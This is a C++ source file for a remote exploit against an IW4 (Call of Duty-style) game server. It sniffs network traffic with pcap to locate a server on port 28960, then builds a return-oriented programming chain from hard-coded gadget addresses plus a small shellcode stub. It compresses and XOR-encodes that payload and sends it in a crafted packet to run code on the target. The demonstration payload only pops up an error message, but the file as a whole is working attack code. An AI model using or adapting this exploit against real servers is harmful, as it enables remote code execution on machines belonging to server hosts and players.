#include "STDInclude.hpp"

#include <pcap.h>
#include "Extern/Huffman.hpp"

#include "Network/Address.hpp"
#include "Network/Socket.hpp"

#include "Core/OOBHandler.hpp"

/* 4 bytes IP address */
typedef struct ip_address
{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct ip_header
{
	u_char	ver_ihl;		// Version (4 bits) + Internet header length (4 bits)
	u_char	tos;			// Type of service 
	u_short tlen;			// Total length 
	u_short identification; // Identification
	u_short flags_fo;		// Flags (3 bits) + Fragment offset (13 bits)
	u_char	ttl;			// Time to live
	u_char	proto;			// Protocol
	u_short crc;			// Header checksum
	ip_address	saddr;		// Source address
	ip_address	daddr;		// Destination address
	u_int	op_pad;			// Option + Padding
}ip_header;

/* UDP header*/
typedef struct udp_header
{
	u_short sport;			// Source port
	u_short dport;			// Destination port
	u_short len;			// Datagram length
	u_short crc;			// Checksum
}udp_header;

struct RefData
{
	Network::Address* target;
	pcap_t* _if;
};

void packetHandler(u_char *param, const struct pcap_pkthdr* /*header*/, const u_char *pkt_data)
{
	RefData* data = reinterpret_cast<RefData*>(param);

	ip_header* ih = (ip_header *)(pkt_data + 14);
	u_int ip_len = (ih->ver_ihl & 0xf) * 4;
	udp_header* uh = (udp_header *)((u_char*)ih + ip_len);

	if (data->target->getPort() == ntohs(uh->sport) || data->target->getPort() == ntohs(uh->dport))
	{
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b1 = ih->saddr.byte1;
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b2 = ih->saddr.byte2;
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b3 = ih->saddr.byte3;
		data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b4 = ih->saddr.byte4;

		if (data->target->isLocal())
		{
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b1 = ih->daddr.byte1;
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b2 = ih->daddr.byte2;
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b3 = ih->daddr.byte3;
			data->target->getInAddr()->sin_addr.S_un.S_un_b.s_b4 = ih->daddr.byte4;

			if (data->target->isLocal())
			{
				return;
			}
		}

		pcap_breakloop(data->_if);
	}
}

Network::Address findTarget(unsigned short port)
{
	printf("Detecting target...\n");
	Network::Address target("127.0.0.1:1");
	target.setPort(port);
	target.getInAddr()->sin_family = AF_INET;

	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&alldevs, errbuf) == 0)
	{
		std::vector<std::pair<pcap_t*, std::thread>> ifs;

		pcap_if_t* __if = alldevs;
		while (__if)
		{
			pcap_t* handle;

			if ((handle = pcap_open_live(__if->name, 65536, 1, 1000, errbuf)) != NULL)
			{
				if (pcap_datalink(handle) == DLT_EN10MB)
				{
					u_int netmask;

					if (__if->addresses != NULL) netmask = ((struct sockaddr_in *)(__if->addresses->netmask))->sin_addr.S_un.S_addr;
					else netmask = 0xffffff;

					ifs.push_back({ handle, std::thread{} });
				}
			}

			__if = __if->next;
		}

		pcap_freealldevs(alldevs);

		std::mutex mutex;
		std::atomic<bool> handled = false;

		for (auto& _if : ifs)
		{
			_if.second = std::thread([&]()
			{
				RefData data;
				data.target = &target;
				data._if = _if.first;

				pcap_loop(_if.first, 0, packetHandler, reinterpret_cast<u_char*>(&data));
				
				std::lock_guard<std::mutex> _(mutex);
				if (!handled)
				{
					handled = true;

					for (auto& __if : ifs)
					{
						if (__if.first != _if.first)
						{
							pcap_breakloop(__if.first);
						}
					}
				}

				pcap_close(_if.first);
			});
		}

		while (!handled)
		{
			std::this_thread::sleep_for(10ms);
		}

		mutex.lock();
		mutex.unlock();

		for (auto& _if : ifs)
		{
			if (_if.second.joinable())
			{
				_if.second.join();
			}
		}
	}

	printf("Discovered %s:%d\n", target.toString().data());

	return target;
}

std::string HuffmanCompressData(std::string data)
{
	Huffman_InitMain();

	Utils::Memory::Allocator allocator;
	byte* target = allocator.allocateArray<byte>(0x10000 + data.size() * 2);

	int size = MSG_WriteBitsCompress(0, reinterpret_cast<const byte*>(data.data()), target, data.size());
	return std::string(LPSTR(target), size);
}

void WriteDataIW4(std::vector<DWORD>* stack, DWORD address, std::string data, bool fakeRegisters)
{
	// Make sure to append at least 1 endmarker for c strings!
	data.append("\0", 1);

	// Make the data divisible by 4
	for (unsigned int i = 0; i < (4 - (data.size() % 4)); ++i) data.append("\0", 1);

	stack->push_back(0x612303); // pop ebx; ret

	for (unsigned int i = 0; i < data.size(); i += 4)
	{
		// Data that will be popped into ebx
		stack->push_back(*(DWORD*)(data.data() + i));

		// Instruction that pops eax
		stack->push_back(0x404C32); // pop eax; ret

									// Data that will be popped into eax
		stack->push_back(address + i); // pointer to the target memory

									   // Transfer the data and pop ebx
		stack->push_back(0x612301); // mov [eax], ebx; pop ebx; ret
	}

	if (fakeRegisters)
	{
		stack->push_back(0); // fake ebx
	}
}

std::string testExploit()
{

	std::vector<DWORD> stack;
	//stack.push_back(0x4D4000);

	WriteDataIW4(&stack, 0x404CA0, "This is a hax!", true);

	stack.push_back(0x433940); // Sys_ShowErrorText
	stack.push_back(0x433983); // restore stack
	stack.push_back(0x404CA0); // message

	stack.push_back(0x4B2412); // restore server

	std::vector<DWORD> fixup;

	if (stack.size() * 4 > 0x800) MessageBoxA(0, "Your payload exceeds the size of the buffer!", "Error", MB_ICONERROR);

	fixup.push_back(0x404C32);  // pop eax
	fixup.push_back(0x31D9390); // old param? not really, but whatever

	static unsigned char shellcode[] =
	{
		0x81, 0xEC, 0x44, 0x08, 0x00, 0x00, // sub esp, 844h
		0xC3                                // retn
	};

	DWORD address = 0x404CA0;
	WriteDataIW4(&fixup, address, std::string((char*)shellcode, sizeof shellcode), true);
	fixup.push_back(address);


	std::string data;
	data.append(LPSTR(stack.data()), stack.size() * 4);
	data.resize(0x800);
	data.append(LPSTR(fixup.data()), fixup.size() * 4);

	return data;
}

int main(int argc, char** argv)
{
	Network::Socket s;
	Core::OOBHandler oobHandler;

	s.onData([&](Network::Address addr, std::string_view view)
	{
		if (oobHandler.handle(&s, addr, view))
		{
			//printf("Handled data %s\n", view.data());
		}
		else
		{
			//printf("Received data %s\n", view.data());
		}
	});

	std::string addressString = "127.0.0.1:28960";
	if (argc > 1) addressString = argv[1];

	Network::Address addr(addressString);
	if (argc <= 1) addr = findTarget(28960);

	oobHandler.connect(&s, addr, "Unknown Soldier", rand() | (rand() << 16) | (rand() << 32) | (rand() << 48), [](Core::OOBHandler* handler, Network::Socket* sock, Network::Address addr)
	{
		Utils::Buffer buffer;
		buffer.write<int>(-2);  // Magic
		buffer.write<int>(1); // Magic seems to get cut off :(
		buffer.write<short>(0); // qport

		buffer.write<char>(0);
		buffer.write<int>(0);
		buffer.write<int>(0);

		std::string compr = HuffmanCompressData(testExploit());

		for (auto& chr : compr)
		{
			chr ^= handler->getKey();
		}

		buffer.append(compr);

		//buffer.resize(0x1000);
		printf("Sending payload...\n");
		sock->send(addr, buffer);
	});
	//s.send(addr, OOB_MAGIC "relay 1234567890");

	_getch();

	return 0;
}
